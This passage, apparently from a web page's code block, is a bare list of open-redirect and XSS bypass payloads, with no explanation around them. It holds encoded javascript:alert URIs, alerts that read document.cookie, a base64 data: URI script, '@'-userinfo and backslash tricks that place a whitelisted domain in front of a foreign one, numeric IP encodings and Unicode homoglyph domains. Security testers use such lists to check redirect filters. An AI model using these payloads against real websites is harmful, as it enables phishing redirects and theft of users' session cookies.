class="line">/javascript:alert(1);</span><br><span class="line">//javascript:alert(1)</span><br><span class="line">/javascript:alert(1)</span><br><span class="line">javascript:%0aalert`1`</span><br><span class="line"><span class="meta">/%</span><span class="bash">5cjavascript:alert(1);</span></span><br><span class="line"><span class="meta">/%</span><span class="bash">5cjavascript:alert(1)</span></span><br><span class="line"><span class="meta">//%</span><span class="bash">5cjavascript:alert(1);</span></span><br><span class="line"><span class="meta">//%</span><span class="bash">5cjavascript:alert(1)</span></span><br><span class="line"><span class="meta">/%</span><span class="bash">09/javascript:alert(1);</span></span><br><span class="line"><span class="meta">/%</span><span class="bash">09/javascript:alert(1)</span></span><br><span class="line"><span class="meta">java%</span><span class="bash">0d%0ascript%0d%0a:alert(0)</span></span><br><span class="line">//localdomain.pw</span><br><span class="line">http:localdomain.pw</span><br><span class="line">https:localdomain.pw</span><br><span class="line"><span class="meta">//localdomain%</span><span class="bash">E3%80%82pw</span></span><br><span class="line">\/\/localdomain.pw/</span><br><span class="line">/\/localdomain.pw/</span><br><span class="line"><span class="meta">/%</span><span class="bash">2f%5c%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77/</span></span><br><span class="line">//\/localdomain.pw/</span><br><span class="line"><span class="meta">//localdomain%</span><span class="bash">00.pw</span></span><br><span class="line">https://www.whitelisteddomain.tld/https://localdomain.pw/</span><br><span class="line">";alert(0);//</span><br><span class="line">javascript://www.whitelisteddomain.tld?%a0alert%281%29</span><br><span class="line">http://0xd8.0x3a.0xd6.0xce</span><br><span class="line">http://www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce</span><br><span class="line">http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce</span><br><span class="line">http://XY&gt;.7d8T\205pZM@0xd8.0x3a.0xd6.0xce</span><br><span class="line">http://0xd83ad6ce</span><br><span class="line">http://www.whitelisteddomain.tld@0xd83ad6ce</span><br><span class="line">http://3H6k7lIAiqjfNeN@0xd83ad6ce</span><br><span class="line">http://XY&gt;.7d8T\205pZM@0xd83ad6ce</span><br><span class="line">http://3627734734</span><br><span class="line">http://www.whitelisteddomain.tld@3627734734</span><br><span class="line">http://3H6k7lIAiqjfNeN@3627734734</span><br><span class="line">http://XY&gt;.7d8T\205pZM@3627734734</span><br><span class="line">http://472.314.470.462</span><br><span class="line">http://www.whitelisteddomain.tld@472.314.470.462</span><br><span class="line">http://3H6k7lIAiqjfNeN@472.314.470.462</span><br><span class="line">http://XY&gt;.7d8T\205pZM@472.314.470.462</span><br><span class="line">http://0330.072.0326.0316</span><br><span class="line">http://www.whitelisteddomain.tld@0330.072.0326.0316</span><br><span class="line">http://3H6k7lIAiqjfNeN@0330.072.0326.0316</span><br><span class="line">http://XY&gt;.7d8T\205pZM@0330.072.0326.0316</span><br><span class="line">http://00330.00072.0000326.00000316</span><br><span class="line">http://www.whitelisteddomain.tld@00330.00072.0000326.00000316</span><br><span class="line">http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316</span><br><span class="line">http://XY&gt;.7d8T\205pZM@00330.00072.0000326.00000316</span><br><span class="line">http://[::216.58.214.206]</span><br><span class="line">http://www.whitelisteddomain.tld@[::216.58.214.206]</span><br><span class="line">http://3H6k7lIAiqjfNeN@[::216.58.214.206]</span><br><span class="line">http://XY&gt;.7d8T\205pZM@[::216.58.214.206]</span><br><span class="line">http://[::ffff:216.58.214.206]</span><br><span class="line">http://www.whitelisteddomain.tld@[::ffff:216.58.214.206]</span><br><span class="line">http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]</span><br><span class="line">http://XY&gt;.7d8T\205pZM@[::ffff:216.58.214.206]</span><br><span class="line">http://0xd8.072.54990</span><br><span class="line">http://www.whitelisteddomain.tld@0xd8.072.54990</span><br><span class="line">http://3H6k7lIAiqjfNeN@0xd8.072.54990</span><br><span class="line">http://XY&gt;.7d8T\205pZM@0xd8.072.54990</span><br><span class="line">http://0xd8.3856078</span><br><span class="line">http://www.whitelisteddomain.tld@0xd8.3856078</span><br><span class="line">http://3H6k7lIAiqjfNeN@0xd8.3856078</span><br><span class="line">http://XY&gt;.7d8T\205pZM@0xd8.3856078</span><br><span class="line">http://00330.3856078</span><br><span class="line">http://www.whitelisteddomain.tld@00330.3856078</span><br><span class="line">http://3H6k7lIAiqjfNeN@00330.3856078</span><br><span class="line">http://XY&gt;.7d8T\205pZM@00330.3856078</span><br><span class="line">http://00330.0x3a.54990</span><br><span class="line">http://www.whitelisteddomain.tld@00330.0x3a.54990</span><br><span class="line">http://3H6k7lIAiqjfNeN@00330.0x3a.54990</span><br><span class="line">http://XY&gt;.7d8T\205pZM@00330.0x3a.54990</span><br><span class="line">http:0xd8.0x3a.0xd6.0xce</span><br><span class="line">http:www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce</span><br><span class="line">http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce</span><br><span class="line">http:XY&gt;.7d8T\205pZM@0xd8.0x3a.0xd6.0xce</span><br><span class="line">http:0xd83ad6ce</span><br><span class="line">http:www.whitelisteddomain.tld@0xd83ad6ce</span><br><span class="line">http:3H6k7lIAiqjfNeN@0xd83ad6ce</span><br><span class="line">http:XY&gt;.7d8T\205pZM@0xd83ad6ce</span><br><span class="line">http:3627734734</span><br><span class="line">http:www.whitelisteddomain.tld@3627734734</span><br><span class="line">http:3H6k7lIAiqjfNeN@3627734734</span><br><span class="line">http:XY&gt;.7d8T\205pZM@3627734734</span><br><span class="line">http:472.314.470.462</span><br><span class="line">http:www.whitelisteddomain.tld@472.314.470.462</span><br><span class="line">http:3H6k7lIAiqjfNeN@472.314.470.462</span><br><span class="line">http:XY&gt;.7d8T\205pZM@472.314.470.462</span><br><span class="line">http:0330.072.0326.0316</span><br><span class="line">http:www.whitelisteddomain.tld@0330.072.0326.0316</span><br><span class="line">http:3H6k7lIAiqjfNeN@0330.072.0326.0316</span><br><span class="line">http:XY&gt;.7d8T\205pZM@0330.072.0326.0316</span><br><span class="line">http:00330.00072.0000326.00000316</span><br><span class="line">http:www.whitelisteddomain.tld@00330.00072.0000326.00000316</span><br><span class="line">http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316</span><br><span class="line">http:XY&gt;.7d8T\205pZM@00330.00072.0000326.00000316</span><br><span class="line">http:[::216.58.214.206]</span><br><span class="line">http:www.whitelisteddomain.tld@[::216.58.214.206]</span><br><span class="line">http:3H6k7lIAiqjfNeN@[::216.58.214.206]</span><br><span class="line">http:XY&gt;.7d8T\205pZM@[::216.58.214.206]</span><br><span class="line">http:[::ffff:216.58.214.206]</span><br><span class="line">http:www.whitelisteddomain.tld@[::ffff:216.58.214.206]</span><br><span class="line">http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]</span><br><span class="line">http:XY&gt;.7d8T\205pZM@[::ffff:216.58.214.206]</span><br><span class="line">http:0xd8.072.54990</span><br><span class="line">http:www.whitelisteddomain.tld@0xd8.072.54990</span><br><span class="line">http:3H6k7lIAiqjfNeN@0xd8.072.54990</span><br><span class="line">http:XY&gt;.7d8T\205pZM@0xd8.072.54990</span><br><span class="line">http:0xd8.3856078</span><br><span class="line">http:www.whitelisteddomain.tld@0xd8.3856078</span><br><span class="line">http:3H6k7lIAiqjfNeN@0xd8.3856078</span><br><span class="line">http:XY&gt;.7d8T\205pZM@0xd8.3856078</span><br><span class="line">http:00330.3856078</span><br><span class="line">http:www.whitelisteddomain.tld@00330.3856078</span><br><span class="line">http:3H6k7lIAiqjfNeN@00330.3856078</span><br><span class="line">http:XY&gt;.7d8T\205pZM@00330.3856078</span><br><span class="line">http:00330.0x3a.54990</span><br><span class="line">http:www.whitelisteddomain.tld@00330.0x3a.54990</span><br><span class="line">http:3H6k7lIAiqjfNeN@00330.0x3a.54990</span><br><span class="line">http:XY&gt;.7d8T\205pZM@00330.0x3a.54990</span><br><span class="line">〱localdomain.pw</span><br><span class="line">〵localdomain.pw</span><br><span class="line">ゝlocaldomain.pw</span><br><span class="line">ーlocaldomain.pw</span><br><span class="line">ｰlocaldomain.pw</span><br><span class="line">/〱localdomain.pw</span><br><span class="line">/〵localdomain.pw</span><br><span class="line">/ゝlocaldomain.pw</span><br><span class="line">/ーlocaldomain.pw</span><br><span class="line">/ｰlocaldomain.pw</span><br><span class="line"><span class="meta">%</span><span class="bash">68%74%74%70%73%3a%2f%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77</span></span><br><span class="line">https://%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77</span><br><span class="line">&lt;&gt;javascript:alert(1);</span><br><span class="line">&lt;&gt;//localdomain.pw</span><br><span class="line">//localdomain.pw\@www.whitelisteddomain.tld</span><br><span class="line">https://:@localdomain.pw\@www.whitelisteddomain.tld</span><br><span class="line">\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)</span><br><span class="line">\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)</span><br><span class="line">ja\nva\tscript\r:alert(1)</span><br><span class="line">\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)</span><br><span class="line">\152\141\166\141\163\143\162\151\160\164\072alert(1)</span><br><span class="line">http://localdomain.pw:80#@www.whitelisteddomain.tld/</span><br><span class="line">http://localdomain.pw:80?@www.whitelisteddomain.tld/</span><br><span class="line">http://3H6k7lIAiqjfNeN@www.whitelisteddomain.tld+@localdomain.pw/</span><br><span class="line">http://3H6k7lIAiqjfNeN@www.whitelisteddomain.tld⁺@localdomain.pw/</span><br><span class="line">http://XY&gt;.7d8T\205pZM@www.whitelisteddomain.tld+@localdomain.pw/</span><br><span class="line">http://XY&gt;.7d8T\205pZM@www.whitelisteddomain.tld⁺@localdomain.pw/</span><br><span class="line">http://3H6k7lIAiqjfNeN@www.whitelisteddomain.tld@localdomain.pw/</span><br><span class="line">http://XY&gt;.7d8T\205pZM@www.whitelisteddomain.tld@localdomain.pw/</span><br><span class="line">http://www.whitelisteddomain.tld+&amp;@localdomain.pw#+@www.whitelisteddomain.tld/</span><br><span class="line">http://www.whitelisteddomain.tld⁺&amp;@localdomain.pw#⁺@www.whitelisteddomain.tld/</span><br><span class="line">http://localdomain.pw\twww.whitelisteddomain.tld/</span><br><span class="line">//localdomain.pw:80#@www.whitelisteddomain.tld/</span><br><span class="line">//localdomain.pw:80?@www.whitelisteddomain.tld/</span><br><span class="line">//3H6k7lIAiqjfNeN@www.whitelisteddomain.tld+@localdomain.pw/</span><br><span class="line">//3H6k7lIAiqjfNeN@www.whitelisteddomain.tld⁺@localdomain.pw/</span><br><span class="line"><span class="meta">//XY&gt;</span><span class="bash">.7d8T\205pZM@www.whitelisteddomain.tld+@localdomain.pw/</span></span><br><span class="line"><span class="meta">//XY&gt;</span><span class="bash">.7d8T\205pZM@www.whitelisteddomain.tld⁺@localdomain.pw/</span></span><br><span class="line">//3H6k7lIAiqjfNeN@www.whitelisteddomain.tld@localdomain.pw/</span><br><span class="line"><span class="meta">//XY&gt;</span><span class="bash">.7d8T\205pZM@www.whitelisteddomain.tld@localdomain.pw/</span></span><br><span class="line">//www.whitelisteddomain.tld+&amp;@localdomain.pw#+@www.whitelisteddomain.tld/</span><br><span class="line">//www.whitelisteddomain.tld⁺&amp;@localdomain.pw#⁺@www.whitelisteddomain.tld/</span><br><span class="line">//localdomain.pw\twww.whitelisteddomain.tld/</span><br><span class="line">//;@localdomain.pw</span><br><span class="line">//﹔@localdomain.pw</span><br><span class="line">http://;@localdomain.pw</span><br><span class="line">http://﹔@localdomain.pw</span><br><span class="line">@localdomain.pw</span><br><span class="line">javascript://https://www.whitelisteddomain.tld/?z=%0Aalert(1)</span><br><span class="line">data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=</span><br><span class="line">http://localdomain.pw%2f%2f.www.whitelisteddomain.tld/</span><br><span class="line">http://localdomain.pw%5c%5c.www.whitelisteddomain.tld/</span><br><span class="line">http://localdomain.pw%3F.www.whitelisteddomain.tld/</span><br><span class="line">http://localdomain.pw%23.www.whitelisteddomain.tld/</span><br><span class="line">http://www.whitelisteddomain.tld:80%40localdomain.pw/</span><br><span class="line">http://www.whitelisteddomain.tld%2elocaldomain.pw/</span><br><span class="line">/x:1/:///%01javascript:alert(document.cookie)/</span><br><span class="line">/https:/%5clocaldomain.pw/</span><br><span class="line">https:/%5clocaldomain.pw/</span><br><span class="line">javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)</span><br><span class="line">javascripT://www.whitelisteddomain.tld/%250d%250aalert(document.cookie)</span><br><span class="line">/http://localdomain.pw</span><br><span class="line"><span class="meta">/%</span><span class="bash">2f%2flocaldomain.pw</span></span><br><span class="line"><span class="meta">//%</span><span class="bash">2f%2flocaldomain.pw</span></span><br><span class="line">/localdomain.pw/%2f%2e%2e</span><br><span class="line">/http:/localdomain.pw</span><br><span class="line">http:/localdomain.pw</span><br><span class="line">/.localdomain.pw</span><br><span class="line">http://.localdomain.pw</span><br><span class="line">.localdomain.pw</span><br><span class="line">///\;@localdomain.pw</span><br><span class="line">///\﹔@localdomain.pw</span><br><span class="line">///localdomain.pw</span><br><span class="line">/////localdomain.pw/</span><br><span class="line">/////localdomain.pw</span><br><span class="line">ja&amp;Tab;vascript:alert(1)</span><br><span class="line">ja&amp;NewLine;vascript:alert(1)</span><br><span class="line">ja&amp;#x0000A;vascript:alert(1)</span><br><span class="line">java&amp;#x73;cript:alert()</span><br><span class="line">javascript&amp;colon;alert()</span><br><span class="line">javascript&amp;#x0003A;alert()</span><br><span class="line">javascript&amp;#58;alert(1)</span><br><span class="line">javascript&amp;#x3A;alert()</span><br><span class="line">javascript:alert&amp;lpar;&amp;rpar;</span><br><span class="line">javascript:al&amp;#x65;rt``</span><br><span class="line">javascript:alert%60%60</span><br><span class="line">javascript:x='%27-alert(1)-%27';</span><br><span class="line">javascript:%61%6c%65%72%74%28%29</span><br><span class="line">javascript:a\u006Cert``"</span><br><span class="line">javascript:\u0061\u006C\u0065\u0072\u0074``</span><br><span class="line"><span class="meta">java%</span><span class="bash">0ascript:alert(1)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(1)</span></span><br><span class="line"><span class="meta">java%</span><span class="bash">09script:alert(1)</span></span><br><span class="line"><span class="meta">java%</span><span class="bash">0dscript:alert(1)</span></span><br><span class="line">javascript://%0aalert(1)</span><br><span class="line">javascript://%0aalert`1`</span><br><span class="line"><span class="meta">Javas%</span><span class="bash">26%2399;ript:alert(1)</span></span><br><span class="line">data:www.whitelisteddomain.tld;text/html;charset=UTF-8,&lt;html&gt;&lt;script&gt;document.write(document.domain);&lt;/script&gt;&lt;iframe/src=xxxxx&gt;aaaa&lt;/iframe&gt;&lt;/html&gt;</span><br><span class="line">jaVAscript://www.whitelisteddomain.tld//%0d%0aalert(1);//</span><br><span class="line">http://www.localdomain.pw\.www.whitelisteddomain.tld</span><br><span class="line"><span class="meta">%</span><span class="bash">19Jav%09asc%09ript:https%20://www.whitelisteddomain.tld/%250Aconfirm%25281%2529</span></span><br><span class="line"><span class="meta">%</span><span class="bash">01https://localdomain.pw</span></span><br><span class="line">www.whitelisteddomain.tld;@localdomain.pw</span><br><span class="line">www.whitelisteddomain.tld﹔@localdomain.pw</span><br><span class="line">https://www.whitelisteddomain.tld;@localdomain.pw</span><br><span class="line">https://www.whitelisteddomain.tld﹔@localdomain.pw</span><br><span class="line">http:%0a%0dlocaldomain.pw</span><br><span class="line">https://%0a%0dlocaldomain.pw</span><br><span class="line">localdomain.pw/www.whitelisteddomain.tld</span><br><span class="line">https://localdomain.pw/www.whitelisteddomain.tld</span><br><span class="line">//localdomain.pw/www.whitelisteddomain.tld</span><br><span class="line">//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..</span><br><span class="line">//www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..</span><br><span class="line">///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..</span><br><span class="line">///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..</span><br><span class="line">////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..</span><br><span class="line">////www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..</span><br><span class="line">https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..</span><br><span class="line">https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..</span><br><span class="line">/https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..</span><br><span class="line">/https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..</span><br><span class="line">//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">//www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">////www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">/https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">/https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">//www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">////www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">/https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">/https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/</span><br><span class="line">//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//</span><br><span class="line">//www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//</span><br><span class="line">///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//</span><br><span class="line">///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//</span><br><span class="line">////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//</span><br><span class="line">////www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//</span><br><span class="line">https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//</span><br><span class="line">https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//</span><br><span class="line">//https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//</span><br><span class="line">//https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//</span><br><span class="line">//Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f</span><br><span class="line">//www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f</span><br><span class="line">///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f</span><br><span class="line">///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f</span><br><span class="line">////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f</span><br><span class="line">////www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f</span><br><span class="line">https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f</span><br><span class="line">https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f</span><br><span class="line">//https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f</span><br><span class="line">//https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f</span><br><span class="line">///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e</span><br><span class="line">///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e</span><br><span class="line">////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e</span><br><span class="line">////www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e</span><br><span class="line">https:///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e</span><br><span class="line">https:///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e</span><br><span class="line">//https:///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e</span><br><span class="line">//www.whitelisteddomain.tld@https:///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e</span><br><span class="line">/https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e</span><br><span class="line">/https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e</span><br><span class="line">///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">////www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">https:///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">https:///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">/https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">/https://www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">/https:///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line">/https:///www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e</span><br><span class="line"><span class="meta">/%</span><span class="bash">09/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line"><span class="meta">/%</span><span class="bash">09/www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line"><span class="meta">//%</span><span class="bash">09/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line"><span class="meta">//%</span><span class="bash">09/www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line"><span class="meta">///%</span><span class="bash">09/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line"><span class="meta">///%</span><span class="bash">09/www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line"><span class="meta">////%</span><span class="bash">09/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line"><span class="meta">////%</span><span class="bash">09/www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line">https://%09/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line">https://%09/www.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span><br><span class="line"><span class="meta">/%</span><span class="bash">5cⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line"><span class="meta">/%</span><span class="bash">5cwww.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line"><span class="meta">//%</span><span class="bash">5cⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line"><span class="meta">//%</span><span class="bash">5cwww.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line"><span class="meta">///%</span><span class="bash">5cⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line"><span class="meta">///%</span><span class="bash">5cwww.whitelisteddomain.tld@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line"><span class="meta">////%</span><span class="bash">5cⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ</span></span><br><span class="line"><span class="meta">////%</span><span 